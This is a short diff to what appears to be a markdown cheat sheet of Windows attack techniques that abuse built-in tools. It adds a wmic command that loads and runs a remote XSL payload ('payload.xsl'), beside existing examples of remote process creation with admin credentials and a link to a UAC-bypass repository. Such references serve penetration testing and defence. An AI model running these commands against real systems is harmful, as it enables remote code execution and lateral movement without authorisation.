@@ -85,7 +85,7 @@ https://github.com/hfiref0x/UACME
   - Description: Command line tool for WMI.
   - Example: wmic process call create "cmd.exe /c calc"
   - Example: wmic /node:[targetIPaddr] /user:[admin] process call create "cmd.exe /c [command]"
-
+  - Example: wmic os get /format:"https://server/payload.xsl"
 
 ### Download Techniques:
 
